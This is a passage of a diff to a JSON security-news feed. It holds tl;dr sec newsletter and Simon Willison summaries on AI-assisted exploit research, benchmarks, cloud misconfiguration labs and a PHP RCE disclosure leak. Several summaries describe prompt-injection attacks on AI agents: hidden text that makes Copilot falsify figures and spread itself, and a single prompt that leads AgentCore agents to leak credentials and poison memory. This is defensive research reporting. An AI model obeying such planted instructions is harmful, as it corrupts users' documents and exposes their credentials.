Harmonic’s demo portal 👈Great to get visibility into AI usage while supporting the business, as people will likely work around bans.AppSecZero to Calc in Six Days: Inside XBOW’s Chrome Full ChainBrendan Dolan-Gavitt describes how XBOW researchers built a Chrome full-chain exploit in six days for $40k in API costs using GPT-5.6 Sol, which received a $250,000 Chrome full-chain reward. The exploit combined a V8 compiler bug, an animated-WebP decoder bug, and a memory-safety bug in Crashpad, which together turned JavaScript execution in an ordinary Chrome tab into code execution outside the renderer sandbox.💡 $40K (not including human costs) to make $250K, not too shabby. Hopefully the required token cost to achieve similar exploit capability will rapidly rise for important targets like Chrome, Linux, etc.Grounded or Gamed? We Audited Our Own Cyber BenchmarkSemgrep's Brenden Noblitt introduces four metrics (beyond true/false positives and negatives) to evaluate whether LLMs reason about vulnerabilities or just pattern-match. Counterfactual checks whether findings disappear when the vulnerability is patched, metamorphic whether findings persist after renaming identifiers, selectivity whether models avoid flagging safe code with similar structure, and stability whether findings hold across scans. Testing IDOR detection across GLM-5.2, Kimi K2.7, MiniMax M3, Claude Opus 4.8, GPT-5.5, and Semgrep Multimodal on a repository with 27 known IDORs, all six models were well-grounded, but every one missed 70% of the real IDORs, and pooling all five LLMs raised union recall to only 29.6%. Models catch textbook IDORs in file-download handlers but miss the same shape on document, prompt, and tool endpoints.💡 This is cool, I like breaking down and measuring model performance across a number of dimensions, not just TP/FP/FN, etc. I will say 27 IDORs is a bit of a small sample set, and if it’s just one repo, does that mean it’s the same programming language and web framework for each vuln? I also wonder if you add in some repo-specific SECURITY.md or AUTHZ.md context, if the same models would perform significantly better. My intuition says yes but would be neat to test 🤔 Sponsor📣 CodeAF: open-source software factory with vulnerability hunting built inCodeAF is a new open-source software factory built for open models like DeepSeek and Qwen, with vulnerability hunting built in. Every candidate must survive a challenge before you see it: a source-to-sink trace, a sanitization check, a concrete exploit path. Findings land as SARIF with CWE IDs and a suggested patch. On one open model it tops DeepSource's published OpenSSF CVE Benchmark table on F1. On DeepSWE, same model, it solved nearly 4× as many real GitHub issues as Claude Code, at 3.4× less per solved issue.👉 Try CodeAF on GitHub 👈Hm, looks like they’re making some interesting workflow decisions and have a cool design. Looking forward to playing around with it.Cloud SecurityWhat Is EntraGoat? A Deliberately Vulnerable Entra ID Simulation EnvironmentSemperis' Jonathan Elkabas and Tomer Nahum released EntraGoat, an open-source deliberately vulnerable Entra ID environment that simulates real-world misconfigurations. The tool uses PowerShell scripts and Microsoft Graph to deploy scenarios including service principal misuse with Graph API permissions, privileged role escalation via application ownership, PIM activation chains and eligible role abuse, dynamic administrative unit poisoning, and certificate authority forgery for Global Admin impersonation. Each challenge starts from an already-compromised identity rather than requiring reconnaissance.AgentCorruption: How A Single Prompt Collapsed The Entire Cloud Security ModelZenity Labs' Tamir Ishay Sharbat and Lana Salameh discovered that AWS Bedrock AgentCore agents could access their instance's IMDS endpoints via SSRF, since the Firecracker microVMs they run in don't isolate network access, allowing an attacker with chat access to extract credentials with a single prompt and compromise all AgentCore agents in the same AWS account and region. The overprivileged default IAM role granted permissions to read all private conversations, pull ECR images, plant persistent memories that hijack agent behavior across future sessions, and extract tool credentials. AWS initially closed the IMDS access report as \"informative\" after implementing IMDSv2 and left the default role unchanged through two follow-up reviews, only restricting its permissions shortly before publication. Their public statement still calls the behavior documented and expected.Blue TeamrunZeroInc/sshambleTool by runZero that finds insecure, unusual, or unique exposures on SSH servers. It inventories authentication capabilities, looks for username-enumeration timing behavior, tests public-key handling, checks the badkeys blocklist, and probes for implementation-specific auth bypasses, pre-auth state transition flaws, or post-session weaknesses. The output is JSONL, which makes it easy to feed into SIEMs or inventory databases for broader asset analysis workflows.Introducing CAIRN: Frontier tracking for AI-integrated malwareCisco Talos' Ryan Fetterman released CAIRN (Cognitive Artifact Intelligence Research Network), a metadata-first hunting toolkit that identifies AI-integrated malware by extracting \"cognitive artifacts\" like prompt templates, API endpoints, jailbreak strings, and AI provider domains from VirusTotal metadata without downloading binaries. The tool uses 24 acquisition filters to discover samples, a three-tier YARA ontology (T1 for AI artifacts, T2 for behavioral context, T3 for family attribution), semantic clustering with HDBSCAN and UMAP for discovering unknown variants, and relationship graphing to map infrastructure and campaign connections. CAIRN's initial findings reveal an \"autonomy escalation arc\" from optional LLM features to fully autonomous multi-model orchestrators within a single year, and an AI-analysis evasion technique traced to a red team instructor that reached unrelated actors within 12 months. See also: The Closed Quorum: Inside the first reported autonomous AI C2 implant.Context Collapse, Part 3 - AI Worming through WordContinuing the Context Collapse series, Håkon Måløy shows how a document-borne AI worm works in Microsoft Copilot for Word, where malicious instructions hidden in an external document (as white text on white background) cause Copilot to alter financial figures in generated reports and copy the full attack payload into each downstream document it produces. The hidden text works because Copilot strips all formatting before passing content to the LLM, so text a human can't see is fully readable to the model. Once the payload reaches a second document the original is no longer needed, and the attack spreads through normal workflows across SharePoint, Teams, and OneDrive as each affected document becomes a new carrier.Over 144 days Microsoft deployed two mitigations including a GPT-5.5 model upgrade, but Håkon reproduced the attack class on GPT-5.6 because the problem is architectural, not implementation-specific.💡 I’ve seen a number of people mention self-propagating AI worms. Hasn’t seen to have been a huge thing yet, but seems feasible 😅 Red TeamREA - Reverse Engineer AnythingOne MCP for reverse engineering across binaries, applications, and runtime behavior. See a feature you like. Understand how it works, down to the binary level. It leverages a number of existing tools like Hopper, Ghidra, or IDA.💡 A week or two ago one of my colleagues said, “reverse engineering is basically saturated/solved by current models.” Super cool project. Being able to build so much so quickly, and understand how arbitrary software works is such a cool time for all of us to be in tech. Feeling #blessed.AI for Offensive Security: What Works, What Does Not, and How to Adopt ItSpecterOps's Russel Van Tuyl examines how AI is currently being used across their consultants’ offensive security work, covering eight use cases from research and analysis, tool development (LLM-generated Mythic agents and Beacon Object Files), and reconnaissance through BloodHound MCP and DeepPass2 (secret scanner), to social engineering, vulnerability discovery, long-running automation, stealth adaptation, and evidence organization. The team has found roughly 40 previously unknown bugs this way, including LPE, RCE, and a container escape, with work that once took months now taking hours or days.Russel believes web application assessments and external network tests are the best current fits, where results are observable and repeatable enough to validate independently. One common failure mode is that models can satisfy a weak success metric without performing the intended action. Russel's advice is to start with bounded problems and measure workflows where they'll actually run.💡 Great overview article that also links to other cool research SpectreOps has done 👍️AI + SecurityQuicklinks:AI Explained - AI Labs Warn Race Makes Breach ‘Inevitable’ - Great overview of some recent eventsOAuth risk analysis: Turn 45 minutes into 15 seconds - OAuth grants are multiplying faster than security teams can review them. Until now. Nudge Security AI agents analyze new OAuth grants, return a verdict, show their reasoning, and act only on what you authorize.*Andrej Karpathy - The gap in shared understanding of LLM capability is widening*SponsoredHow DigitalOcean Manages Credentials for Autonomous AgentsDigitalOcean's Tyler Healy describes their Managed Agents architecture that prevents autonomous agents from ever holding credentials directly, instead brokering access through their Action Gateway at execution time and running agents in isolated microVM sandboxes with zero-egress network policies and non-root execution. For workloads the gateway doesn't broker, three credential tiers decide who can read the value back:env for non-sensitive config, scanned for credential-shaped prefixes like sk- and AKIA.secrets for encrypted storage that still injects the real credential into the sandbox where anything the agent spawns can read it.Scoped secrets that bind a credential to one HTTPS destination so the sandbox only receives a short-lived handle redeemed by an egress proxy. Sub-agents each get their own microVM and resolve their own handle, so a fan-out of fifty sessions carries the same exposure as one, with the whole thing designed to fit NVIDIA's OpenShell policy schema and leave the boundaries in a spec security teams can version.Test-driving Jev on a security task: identity resolutionVincenzo Iozzo evaluates Jev, TypeSafe's “type one thinking” decision model, on identity resolution, the problem of working out which of a company's scattered accounts belong to the same person, comparing it against Claude Opus 5.5, Sonnet 5 and Haiku 4.5, a prompted gpt-oss-20b baseline, and traditional entity resolution methods. Jev came out ahead on the large environments at a fraction of the Claude models' cost and roughly ten times their speed, which matters at the scale of a 100,000-account directory.Jev connects JDOE to jane.doe@company.example through the company's naming convention and refuses msmith and msmith1 because the second account exists precisely because a second M. Smith joined. The older methods can't do that, with classic record linkage getting close on tidy directories but falling apart on messy ones, and a supervised classifier trained on four environments collapsing on the fifth. Jev isn't flawless either, since duplicate guest invitations and secondary accounts land in a maybe zone just under its cut-off, though sending those to Sonnet 5 for a second opinion recovers most of them.MiscProf Gio - You Truly Don't Understand What Just Happened to MathematicsTerence Tao - Math 2.0 - “Particularly in pure mathematics, open problems serve as “lighthouses”: not destinations to be reached in and of themselves, but as useful guides to explore the mathematical landscape around these problems.”“The lessons learned while attempting to solve these problems — whether they succeed, fail, or achieve partial progress — are often more valuable than the final solution to the problem itself.”“Reaching these lighthouses prematurely by automated tools can disrupt the exploration of the paths not taken, and sterilize the surrounding field.”InfoWars HQ ft. Dev Lemons, Graham Platner, Griffin Kelly (Episode 1) - The Onion bought InfoWars, and now they’re creating content 😂 Family of Epstein Victim Appears in Ad Targeting RepublicanNikita Bier - Vibe fabricating a dog door with a WiFi-controlled lock, and getting it manufacturedSendCutSend - Fast custom parts, at any scale. Sheet metal fabrication, CNC machining, and much more delivered in as little as 24 hours.ArtCraft - Someone tried to recreate in Rust and open source all of Adobe’s creative suiteWes Box - Hacking Cheap Smart Photo Frames into a Family DashboardFireship - Every app on Earth is now open source... whether it likes it or notRecording device hidden in toilet paper found in top-secret OpenAI meeting room - Super chill week, like usual 😂 SNL - Father-Daughter Songwallhop - Paste a link. Get the story. No paywall, no signup.Shape-sensing sheet digitally tracks its movement as it bends and twists - Developed by MIT engineers, this flexible material could be used as a wearable, motion-monitoring “skin” in physical therapy, virtual reality, and gaming.✉️ Wrapping UpHave questions, comments, or feedback? Just reply directly, I’d love to hear from you.If you find this newsletter useful and know other people who would too, I'd really appreciate if you'd forward it to them 🙏Thanks for reading!Cheers,ClintP.S. Feel free to connect with me on LinkedIn 👋 Powered by beehiiv",
-      "tags": [
-        "appsec",
-        "watchlist",
-        "AI-sec",
-        "web",
-        "ssrf",
-        "rce"
-      ],
-      "title": "[tl;dr sec] #350 - Reverse Engineer Anything, Tracking AI-integrated Malware, Test-driving Jev",
-      "url": "https://tldrsec.com/p/tldr-sec-350"
-    },
-    {
-      "appsec": true,
       "cves": [
         "CVE-2026-4747"
       ],
@@ -797,6 +768,35 @@
       ],
       "title": "[tl;dr sec] #332 - I've Joined OpenAI, fwd:cloudsec, AWS Well Architected Supply Chain Security",
       "url": "https://tldrsec.com/p/tldr-sec-332"
+    },
+    {
+      "appsec": true,
+      "cves": [],
+      "epss": null,
+      "feed": "news",
+      "id": "ab3b0b6479de9de2",
+      "kev": false,
+      "published": "2026-10-15T14:30:00Z",
+      "score": 38.0,
+      "score_reasons": [
+        "source:tl;dr sec (+8)",
+        "watchlist:javascript,sharepoint,ssrf (+15)",
+        "AppSec-relevant (+14)",
+        "recency (+1.0)"
+      ],
+      "source": "tl;dr sec",
+      "source_type": "news",
+      "summary": "Hey there,I hope you’ve been doing well!🤔 AdviceOne of the biggest emotional intelligence unlocks I’ve had is learning to differentiate when a partner or friend is wanting to a) vent or b) problem solve.It’s kind of embarrassing, but I think I was late 20’s to early 30’s when that really sunk in.I also noticed that (most) therapists seem to not want to tell you what to do.When I first started therapy, I went in thinking, “OK, you’re an expert in this space and have spent years studying it. I am going to give you my full context and then you can give me an educated, weighted advice and plan based on your knowledge + my specific context.”But it was difficult to get them to give a “this is the answer” or “you should do X” type judgement.After some reflection and further discussion, it makes sense why, though I still kind of find it annoying to be honest.Maybe they’re worried about this:I’ve found long discussions with friends who’ve known me for years really helpful for stuff like this (shout-out my bud Daniel Miessler). I hope you too have friends with whom you’re filling up your relational context window 😂 Sponsor📣 Personal AI agents are crossing the corporate trust boundaryAn employee connects their personal AI agent to Slack. Now it can read internal conversations, access files, and act through authenticated sessions. Computer-use agents introduce a new class of unmanaged access that traditional SaaS discovery, EDR and DLP weren't built to address.Harmonic gives security teams visibility into employee AI usage and the sensitive data flowing into AI tools, so you can identify risky behavior without blocking adoption.👉 Explore Harmonic’s demo portal 👈Great to get visibility into AI usage while supporting the business, as people will likely work around bans.AppSecZero to Calc in Six Days: Inside XBOW’s Chrome Full ChainBrendan Dolan-Gavitt describes how XBOW researchers built a Chrome full-chain exploit in six days for $40k in API costs using GPT-5.6 Sol, which received a $250,000 Chrome full-chain reward. The exploit combined a V8 compiler bug, an animated-WebP decoder bug, and a memory-safety bug in Crashpad, which together turned JavaScript execution in an ordinary Chrome tab into code execution outside the renderer sandbox.💡 $40K (not including human costs) to make $250K, not too shabby. Hopefully the required token cost to achieve similar exploit capability will rapidly rise for important targets like Chrome, Linux, etc.Grounded or Gamed? We Audited Our Own Cyber BenchmarkSemgrep's Brenden Noblitt introduces four metrics (beyond true/false positives and negatives) to evaluate whether LLMs reason about vulnerabilities or just pattern-match. Counterfactual checks whether findings disappear when the vulnerability is patched, metamorphic whether findings persist after renaming identifiers, selectivity whether models avoid flagging safe code with similar structure, and stability whether findings hold across scans. Testing IDOR detection across GLM-5.2, Kimi K2.7, MiniMax M3, Claude Opus 4.8, GPT-5.5, and Semgrep Multimodal on a repository with 27 known IDORs, all six models were well-grounded, but every one missed 70% of the real IDORs, and pooling all five LLMs raised union recall to only 29.6%. Models catch textbook IDORs in file-download handlers but miss the same shape on document, prompt, and tool endpoints.💡 This is cool, I like breaking down and measuring model performance across a number of dimensions, not just TP/FP/FN, etc. I will say 27 IDORs is a bit of a small sample set, and if it’s just one repo, does that mean it’s the same programming language and web framework for each vuln? I also wonder if you add in some repo-specific SECURITY.md or AUTHZ.md context, if the same models would perform significantly better. My intuition says yes but would be neat to test 🤔 Sponsor📣 CodeAF: open-source software factory with vulnerability hunting built inCodeAF is a new open-source software factory built for open models like DeepSeek and Qwen, with vulnerability hunting built in. Every candidate must survive a challenge before you see it: a source-to-sink trace, a sanitization check, a concrete exploit path. Findings land as SARIF with CWE IDs and a suggested patch. On one open model it tops DeepSource's published OpenSSF CVE Benchmark table on F1. On DeepSWE, same model, it solved nearly 4× as many real GitHub issues as Claude Code, at 3.4× less per solved issue.👉 Try CodeAF on GitHub 👈Hm, looks like they’re making some interesting workflow decisions and have a cool design. Looking forward to playing around with it.Cloud SecurityWhat Is EntraGoat? A Deliberately Vulnerable Entra ID Simulation EnvironmentSemperis' Jonathan Elkabas and Tomer Nahum released EntraGoat, an open-source deliberately vulnerable Entra ID environment that simulates real-world misconfigurations. The tool uses PowerShell scripts and Microsoft Graph to deploy scenarios including service principal misuse with Graph API permissions, privileged role escalation via application ownership, PIM activation chains and eligible role abuse, dynamic administrative unit poisoning, and certificate authority forgery for Global Admin impersonation. Each challenge starts from an already-compromised identity rather than requiring reconnaissance.AgentCorruption: How A Single Prompt Collapsed The Entire Cloud Security ModelZenity Labs' Tamir Ishay Sharbat and Lana Salameh discovered that AWS Bedrock AgentCore agents could access their instance's IMDS endpoints via SSRF, since the Firecracker microVMs they run in don't isolate network access, allowing an attacker with chat access to extract credentials with a single prompt and compromise all AgentCore agents in the same AWS account and region. The overprivileged default IAM role granted permissions to read all private conversations, pull ECR images, plant persistent memories that hijack agent behavior across future sessions, and extract tool credentials. AWS initially closed the IMDS access report as \"informative\" after implementing IMDSv2 and left the default role unchanged through two follow-up reviews, only restricting its permissions shortly before publication. Their public statement still calls the behavior documented and expected.Blue TeamrunZeroInc/sshambleTool by runZero that finds insecure, unusual, or unique exposures on SSH servers. It inventories authentication capabilities, looks for username-enumeration timing behavior, tests public-key handling, checks the badkeys blocklist, and probes for implementation-specific auth bypasses, pre-auth state transition flaws, or post-session weaknesses. The output is JSONL, which makes it easy to feed into SIEMs or inventory databases for broader asset analysis workflows.Introducing CAIRN: Frontier tracking for AI-integrated malwareCisco Talos' Ryan Fetterman released CAIRN (Cognitive Artifact Intelligence Research Network), a metadata-first hunting toolkit that identifies AI-integrated malware by extracting \"cognitive artifacts\" like prompt templates, API endpoints, jailbreak strings, and AI provider domains from VirusTotal metadata without downloading binaries. The tool uses 24 acquisition filters to discover samples, a three-tier YARA ontology (T1 for AI artifacts, T2 for behavioral context, T3 for family attribution), semantic clustering with HDBSCAN and UMAP for discovering unknown variants, and relationship graphing to map infrastructure and campaign connections. CAIRN's initial findings reveal an \"autonomy escalation arc\" from optional LLM features to fully autonomous multi-model orchestrators within a single year, and an AI-analysis evasion technique traced to a red team instructor that reached unrelated actors within 12 months. See also: The Closed Quorum: Inside the first reported autonomous AI C2 implant.Context Collapse, Part 3 - AI Worming through WordContinuing the Context Collapse series, Håkon Måløy shows how a document-borne AI worm works in Microsoft Copilot for Word, where malicious instructions hidden in an external document (as white text on white background) cause Copilot to alter financial figures in generated reports and copy the full attack payload into each downstream document it produces. The hidden text works because Copilot strips all formatting before passing content to the LLM, so text a human can't see is fully readable to the model. Once the payload reaches a second document the original is no longer needed, and the attack spreads through normal workflows across SharePoint, Teams, and OneDrive as each affected document becomes a new carrier.Over 144 days Microsoft deployed two mitigations including a GPT-5.5 model upgrade, but Håkon reproduced the attack class on GPT-5.6 because the problem is architectural, not implementation-specific.💡 I’ve seen a number of people mention self-propagating AI worms. Hasn’t seen to have been a huge thing yet, but seems feasible 😅 Red TeamREA - Reverse Engineer AnythingOne MCP for reverse engineering across binaries, applications, and runtime behavior. See a feature you like. Understand how it works, down to the binary level. It leverages a number of existing tools like Hopper, Ghidra, or IDA.💡 A week or two ago one of my colleagues said, “reverse engineering is basically saturated/solved by current models.” Super cool project. Being able to build so much so quickly, and understand how arbitrary software works is such a cool time for all of us to be in tech. Feeling #blessed.AI for Offensive Security: What Works, What Does Not, and How to Adopt ItSpecterOps's Russel Van Tuyl examines how AI is currently being used across their consultants’ offensive security work, covering eight use cases from research and analysis, tool development (LLM-generated Mythic agents and Beacon Object Files), and reconnaissance through BloodHound MCP and DeepPass2 (secret scanner), to social engineering, vulnerability discovery, long-running automation, stealth adaptation, and evidence organization. The team has found roughly 40 previously unknown bugs this way, including LPE, RCE, and a container escape, with work that once took months now taking hours or days.Russel believes web application assessments and external network tests are the best current fits, where results are observable and repeatable enough to validate independently. One common failure mode is that models can satisfy a weak success metric without performing the intended action. Russel's advice is to start with bounded problems and measure workflows where they'll actually run.💡 Great overview article that also links to other cool research SpectreOps has done 👍️AI + SecurityQuicklinks:AI Explained - AI Labs Warn Race Makes Breach ‘Inevitable’ - Great overview of some recent eventsOAuth risk analysis: Turn 45 minutes into 15 seconds - OAuth grants are multiplying faster than security teams can review them. Until now. Nudge Security AI agents analyze new OAuth grants, return a verdict, show their reasoning, and act only on what you authorize.*Andrej Karpathy - The gap in shared understanding of LLM capability is widening*SponsoredHow DigitalOcean Manages Credentials for Autonomous AgentsDigitalOcean's Tyler Healy describes their Managed Agents architecture that prevents autonomous agents from ever holding credentials directly, instead brokering access through their Action Gateway at execution time and running agents in isolated microVM sandboxes with zero-egress network policies and non-root execution. For workloads the gateway doesn't broker, three credential tiers decide who can read the value back:env for non-sensitive config, scanned for credential-shaped prefixes like sk- and AKIA.secrets for encrypted storage that still injects the real credential into the sandbox where anything the agent spawns can read it.Scoped secrets that bind a credential to one HTTPS destination so the sandbox only receives a short-lived handle redeemed by an egress proxy. Sub-agents each get their own microVM and resolve their own handle, so a fan-out of fifty sessions carries the same exposure as one, with the whole thing designed to fit NVIDIA's OpenShell policy schema and leave the boundaries in a spec security teams can version.Test-driving Jev on a security task: identity resolutionVincenzo Iozzo evaluates Jev, TypeSafe's “type one thinking” decision model, on identity resolution, the problem of working out which of a company's scattered accounts belong to the same person, comparing it against Claude Opus 5.5, Sonnet 5 and Haiku 4.5, a prompted gpt-oss-20b baseline, and traditional entity resolution methods. Jev came out ahead on the large environments at a fraction of the Claude models' cost and roughly ten times their speed, which matters at the scale of a 100,000-account directory.Jev connects JDOE to jane.doe@company.example through the company's naming convention and refuses msmith and msmith1 because the second account exists precisely because a second M. Smith joined. The older methods can't do that, with classic record linkage getting close on tidy directories but falling apart on messy ones, and a supervised classifier trained on four environments collapsing on the fifth. Jev isn't flawless either, since duplicate guest invitations and secondary accounts land in a maybe zone just under its cut-off, though sending those to Sonnet 5 for a second opinion recovers most of them.MiscProf Gio - You Truly Don't Understand What Just Happened to MathematicsTerence Tao - Math 2.0 - “Particularly in pure mathematics, open problems serve as “lighthouses”: not destinations to be reached in and of themselves, but as useful guides to explore the mathematical landscape around these problems.”“The lessons learned while attempting to solve these problems — whether they succeed, fail, or achieve partial progress — are often more valuable than the final solution to the problem itself.”“Reaching these lighthouses prematurely by automated tools can disrupt the exploration of the paths not taken, and sterilize the surrounding field.”InfoWars HQ ft. Dev Lemons, Graham Platner, Griffin Kelly (Episode 1) - The Onion bought InfoWars, and now they’re creating content 😂 Family of Epstein Victim Appears in Ad Targeting RepublicanNikita Bier - Vibe fabricating a dog door with a WiFi-controlled lock, and getting it manufacturedSendCutSend - Fast custom parts, at any scale. Sheet metal fabrication, CNC machining, and much more delivered in as little as 24 hours.ArtCraft - Someone tried to recreate in Rust and open source all of Adobe’s creative suiteWes Box - Hacking Cheap Smart Photo Frames into a Family DashboardFireship - Every app on Earth is now open source... whether it likes it or notRecording device hidden in toilet paper found in top-secret OpenAI meeting room - Super chill week, like usual 😂 SNL - Father-Daughter Songwallhop - Paste a link. Get the story. No paywall, no signup.Shape-sensing sheet digitally tracks its movement as it bends and twists - Developed by MIT engineers, this flexible material could be used as a wearable, motion-monitoring “skin” in physical therapy, virtual reality, and gaming.✉️ Wrapping UpHave questions, comments, or feedback? Just reply directly, I’d love to hear from you.If you find this newsletter useful and know other people who would too, I'd really appreciate if you'd forward it to them 🙏Thanks for reading!Cheers,ClintP.S. Feel free to connect with me on LinkedIn 👋 Powered by beehiiv",
+      "tags": [
+        "appsec",
+        "watchlist",
+        "AI-sec",
+        "web",
+        "ssrf",
+        "rce"
+      ],
+      "title": "[tl;dr sec] #350 - Reverse Engineer Anything, Tracking AI-integrated Malware, Test-driving Jev",
+      "url": "https://tldrsec.com/p/tldr-sec-350"
     },
     {
       "appsec": true,
@@ -1005,34 +1005,6 @@
       ],
       "title": "Risky Bulletin: BGP hijack delivers malicious Virtualizor updates",
       "url": "https://risky.biz/RBNEWS608/"
-    },
-    {
-      "appsec": true,
-      "cves": [],
-      "epss": null,
-      "feed": "news",
-      "id": "1426feceb5c03ac9",
-      "kev": false,
-      "published": "2026-10-21T18:41:53Z",
-      "score": 37.0,
-      "score_reasons": [
-        "source:Simon Willison (+6)",
-        "watchlist:php,wordpress,drupal (+15)",
-        "AppSec-relevant (+14)",
-        "recency (+2.0)"
-      ],
-      "source": "Simon Willison",
-      "source_type": "news",
-      "summary": "Today's PHP Security Release, and How We're Strengthening PHP Security If you're running anything on PHP it's vital you upgrade - today's updates (across the entire PHP 8.x line) address two remote code execution holes, and there have been exploits circulating since last night, thanks to a leak in the coordinated disclosure process. This post from the PHP Foundation explain what went so wrong: On Tuesday, October 20th, at around 15:00 UTC, the two CVE IDs began circulating on online forums and social media. They came with a wrong release time and a wrong CVSS score of 10.0 (the actual score is 9.2). No technical details leaked. In response, the PHP project brought its pre-announcement forward and published it at 19:30 UTC. It also moved the release from October 22nd, 14:00 UTC, to October 21st, 14:00 UTC [...] As a result of the leak and pre-announcement around 20:00 UTC, Calif, one of the security firms that had reported the issues mistakenly published a video. It showed their proof of concept working against a number of targets and revealed a few additional, though limited, details about the vulnerabilities. Copies of the deleted video started circulating on social media soon after. The video contributed to accelerated development of various PoCs (exploitation proof of concepts), which then increased circulation on October 21st. This article from the team that discovered the original vulnerability includes a more detailed timeline of the original intended responsible disclosure: August 19, 2026: Wiz Research discovers the first PHP vulnerability using Wiz Atlas, Gemini 4 Argon, and GPT-5.6 Sol. August 20, 2026: Unauthenticated RCE is confirmed against Drupal. August 21, 2026: Unauthenticated RCE is confirmed against WordPress. August 24, 2026: Wiz Research reports the vulnerabilities to the PHP security team. September 21, 2026: PHP acknowledges the reports and begins developing a coordinated fix. October 21, 2026: Patched PHP releases become available. October 21, 2026: Public disclosure. Via Hacker News Tags: open-source, php, security, ai, ai-security-research",
-      "tags": [
-        "appsec",
-        "watchlist",
-        "php",
-        "web",
-        "rce"
-      ],
-      "title": "Today's PHP Security Release, and How We're Strengthening PHP Security",
-      "url": "https://simonwillison.net/2026/Oct/21/php-security-release/"
     },
     {
       "appsec": true,
@@ -1563,6 +1535,34 @@
       "cves": [],
       "epss": null,
       "feed": "news",
+      "id": "1426feceb5c03ac9",
+      "kev": false,
+      "published": "2026-10-21T18:41:53Z",
+      "score": 36.9,
+      "score_reasons": [
+        "source:Simon Willison (+6)",
+        "watchlist:php,wordpress,drupal (+15)",
+        "AppSec-relevant (+14)",
+        "recency (+1.9)"
+      ],
+      "source": "Simon Willison",
+      "source_type": "news",
+      "summary": "Today's PHP Security Release, and How We're Strengthening PHP Security If you're running anything on PHP it's vital you upgrade - today's updates (across the entire PHP 8.x line) address two remote code execution holes, and there have been exploits circulating since last night, thanks to a leak in the coordinated disclosure process. This post from the PHP Foundation explain what went so wrong: On Tuesday, October 20th, at around 15:00 UTC, the two CVE IDs began circulating on online forums and social media. They came with a wrong release time and a wrong CVSS score of 10.0 (the actual score is 9.2). No technical details leaked. In response, the PHP project brought its pre-announcement forward and published it at 19:30 UTC. It also moved the release from October 22nd, 14:00 UTC, to October 21st, 14:00 UTC [...] As a result of the leak and pre-announcement around 20:00 UTC, Calif, one of the security firms that had reported the issues mistakenly published a video. It showed their proof of concept working against a number of targets and revealed a few additional, though limited, details about the vulnerabilities. Copies of the deleted video started circulating on social media soon after. The video contributed to accelerated development of various PoCs (exploitation proof of concepts), which then increased circulation on October 21st. This article from the team that discovered the original vulnerability includes a more detailed timeline of the original intended responsible disclosure: August 19, 2026: Wiz Research discovers the first PHP vulnerability using Wiz Atlas, Gemini 4 Argon, and GPT-5.6 Sol. August 20, 2026: Unauthenticated RCE is confirmed against Drupal. August 21, 2026: Unauthenticated RCE is confirmed against WordPress. August 24, 2026: Wiz Research reports the vulnerabilities to the PHP security team. September 21, 2026: PHP acknowledges the reports and begins developing a coordinated fix. October 21, 2026: Patched PHP releases become available. October 21, 2026: Public disclosure. Via Hacker News Tags: open-source, php, security, ai, ai-security-research",
+      "tags": [
+        "appsec",
+        "watchlist",
+        "php",
+        "web",
+        "rce"
+      ],
+      "title": "Today's PHP Security Release, and How We're Strengthening PHP Security",
+      "url": "https://simonwillison.net/2026/Oct/21/php-security-release/"
+    },
+    {
+      "appsec": true,
+      "cves": [],
+      "epss": null,
+      "feed": "news",
       "id": "d7da1053e3ecdb1a",
       "kev": false,
       "published": "2026-10-20T23:50:25Z",
@@ -1618,15 +1618,15 @@
       "id": "5767c4d342983118",
       "kev": false,
       "published": "2026-11-10T20:09:44Z",
-      "score": 35.4,
+      "score": 34.9,
       "score_reasons": [
         "source:Simon Willison (+6)",
         "watchlist:llm (+15)",
-        "recency (+14.4)"
+        "recency (+13.9)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
-      "summary": "Release: llm-gemini 0.36 Gemini 4 Carbon was announced two weeks ago for \"a subset of cyber defenders\", but today it's available to everyone else. This is Google's best ever Gemini, priced at $2/million input and $10/million output at launch (that's GPT-6.1 Sol / Claude Sonnet 5.5 prices) but scheduled to double in price to $4/$20 on December 1st (same as Opus 5.5). Here are three pelicans for the low, medium and high thinking efforts (it defaults to medium). This is the pelican I got for high: Gemini pelicans have all been great for a while now, so I also tested it out using Google's Antigravity IDE with a prompt I first tried with Claude Fable 5.2 yesterday: Make a three js animation where yonkers stands up as a big mech (cool stand up motion) and stomps around manhattan and queens and Brooklyn, use openstreetmap mapping data Here's the HTML result (I had to prompt \"build that into a standalone HTML file\" to get a version with no external dependencies). I then screen-captured that as a video: Update: Huh, just saw this on YouTube: Using Google Antigravity’s /swarm feature, Carbon built an open-world 3D game where you explore Google’s Mountain View campus as a pelican riding a GBike — coordinating subagents to model 3D assets in Blender from Omni and Nano Banana references, build the browser game in Three.js with WebGL shaders, and pair procedural Web Audio sound effects with Lyria music. Tags: llm-release, gemini, llm, google, generative-ai, ai, llms, pelican-riding-a-bicycle",
+      "summary": "Release: llm-gemini 0.36 Gemini 4 Carbon was announced two weeks ago for \"a subset of cyber defenders\", but today it's available to everyone else. This is Google's best ever Gemini, priced at $2/million input and $10/million output at launch (that's GPT-6.1 Sol / Claude Sonnet 5.5 prices) but scheduled to double in price to $4/$20 on December 1st (same as Opus 5.5). Here are three pelicans for the low, medium and high thinking efforts (it defaults to medium). This is the pelican I got for high: Gemini pelicans have all been great for a while now, so I also tested it out using Google's Antigravity IDE with a prompt I first tried with Claude Fable 5.2 yesterday: Make a three js animation where yonkers stands up as a big mech (cool stand up motion) and stomps around manhattan and queens and Brooklyn, use openstreetmap mapping data Here's the HTML result (I had to prompt \"build that into a standalone HTML file\" to get a version with no external dependencies). I then screen-captured that as a video: Update: Huh, just saw this on YouTube (and tweeted by Sundar Pichai): Using Google Antigravity’s /swarm feature, Carbon built an open-world 3D game where you explore Google’s Mountain View campus as a pelican riding a GBike — coordinating subagents to model 3D assets in Blender from Omni and Nano Banana references, build the browser game in Three.js with WebGL shaders, and pair procedural Web Audio sound effects with Lyria music. Here's the playable version in AI Studio. Tags: llm-release, gemini, llm, google, generative-ai, ai, llms, pelican-riding-a-bicycle",
       "tags": [
         "watchlist",
         "AI-sec"
@@ -1642,11 +1642,11 @@
       "id": "6ee1d6d470e6a201",
       "kev": false,
       "published": "2026-11-10T07:28:21Z",
-      "score": 34.7,
+      "score": 34.2,
       "score_reasons": [
         "source:Simon Willison (+6)",
         "watchlist:llm (+15)",
-        "recency (+13.7)"
+        "recency (+13.2)"
       ],
       "source": "Simon Willison",
       "source_type": "news",
@@ -1666,11 +1666,11 @@
       "id": "6c9f2309ad1225ae",
       "kev": false,
       "published": "2026-11-09T23:57:21Z",
-      "score": 34.3,
+      "score": 33.8,
       "score_reasons": [
         "source:Simon Willison (+6)",
         "watchlist:python,javascript (+15)",
-        "recency (+13.3)"
+        "recency (+12.8)"
       ],
       "source": "Simon Willison",
